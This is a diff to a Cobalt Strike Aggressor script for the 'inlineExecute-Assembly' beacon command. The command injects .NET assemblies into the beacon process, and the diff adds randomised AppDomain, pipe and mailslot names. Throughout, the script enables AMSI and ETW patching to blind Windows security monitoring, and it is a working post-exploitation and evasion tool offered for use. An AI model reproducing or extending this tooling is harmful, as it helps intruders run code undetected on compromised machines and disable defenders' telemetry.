@@ -1,33 +1,25 @@
 #Register command
 beacon_command_register(
 "inlineExecute-Assembly", 
-"Load CLR if not already loaded and inject .NET assembly into current beacon process. Avoids creating a new sacraficial process via fork and run technique", 
-"Synopsis: inlineExecute-Assembly --dotnetassembly /path/to/Assembly.exe --assemblyargs My Args To Pass --amsi --etw");
+"Load CLR if not already loaded and inject .NET assembly into current beacon process. Avoids creating a new sacraficial process via fork and run technique. Created by anthemtotheego modified by Ceramicskate0", 
+"Synopsis: inlineExecute-Assembly --dotnetassembly /root/Downloads/release/Assembly.exe --assemblyargs Args_To_Pass --amsi --etw");
 
 global('$etw $amsi $appDomain $version');
 
 #Global vars don't change
+#1==true do it
+#0=false dont do it
 $etw = 1;
 $revertETW = 1;
 $amsi = 1;
 $mailSlot = 0;
 $entryPoint = 1;
-@alphabet = @(“a”,“_”,“-”,“b”,“c”,“d”,“e”,“f”,“g”,“h”,“i”,“j”,“k”,“l”,“m”,“n”,“o”,“p”,“q”,“r”,“s”,“t”,“u”,“v”,“w”,“x”,“y”,“z”,“A”,“B”,“C”,“D”,“E”,“F”,“G”,“H”,“I”,“J”,“K”,“L”,“M”,“N”,“O”,“P”,“Q”,“R”,“S”,“T”,“U”,“V”,“W”,“X”,“Y”,“Z”);
-$len = rand(11) + 5;	
-for($i = 0; $i < $len; $i++){
-    $name .= rand(@alphabet);
 
 #Default values set here - if you don't want to use flags to change -> change here
-$appDomain = rand(@name);
-$len = rand(11) + 5;	
-for($i = 0; $i < $len; $i++){
-    $name .= rand(@alphabet);
-$pipeName = rand(@name);
-$len = rand(11) + 5;	
-for($i = 0; $i < $len; $i++){
-    $name .= rand(@alphabet);
-$mailSlotName = rand(@name);
-
+#No need to change its handled in alias inlineExecute-Assembly 
+$appDomain = "AppDomain";
+$pipeName = "Pipename";
+$mailSlotName = "Mailslot";
 
 alias inlineExecute-Assembly {
 
@@ -51,6 +43,25 @@ alias inlineExecute-Assembly {
     $_dotNetAssembly = "";
     $_dotNetAssemblyArgs = "";
     $_assemblyWithArgs = "";
+    
+    #THX to SadPanda for the random(enoughf) name gen algo
+    @alphabet = @("a","_","-","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z");
+    $len = rand(11) + 5;	
+    for($i = 0; $i < $len; $i++){
+        $_appDomain .= rand(@alphabet);
+    }
+    #$appDomain = @name;
+
+    $len = rand(11) + 5;	
+    for($i = 0; $i < $len; $i++){
+        $_pipeName .= rand(@alphabet);
+    }
+    #$pipeName = @name;
+
+    $len = rand(11) + 5;	
+    for($i = 0; $i < $len; $i++){
+        $_mailSlotName .= rand(@alphabet);
+    }
 
     @CliOptions = @("--amsi", "--etw", "--revertetw", "--dotnetassembly", "--assemblyargs", "--appdomain", "--pipe", "--mailslot", "--main");
 
@@ -360,9 +371,8 @@ alias inlineExecute-Assembly {
 
      # pack our arguments
     $bofArgs = bof_pack($1, "ziiiiizzzib", $_appDomainArgs, $_amsi, $_etw, $_revertETW, $_mailSlot, $_entryPoint, $_mailSlotNameArgs, $_pipeNameArgs, $_assemblyWithArgs, $assemblyLength, $assemblyBytes);
-
-    # announce what we're doing 
-    btask($1, "Running inlineExecute-Assembly by (@anthemtotheego)");
+    # announce what we're doing
+    btask($1, "Running CSharp Assembly Inline Details Below (REF: 1=yes 0=no):\n Assembly Name: ".$_dotNetAssembly."\n Assembly Args: ".$_dotNetAssemblyArgs."\n AppDomain: ".$_appDomain."\n Pipe Name: ".$_pipeName."\n MailSlot Name: ".$_mailSlotName."\n ETW Patch: ".$_etw."\n AMSI Patch: ".$_amsi."\n Revert ETW Patch: ".$_revertETW."");
 
     # execute it.
     beacon_inline_execute($1, $bof, "go", $bofArgs);
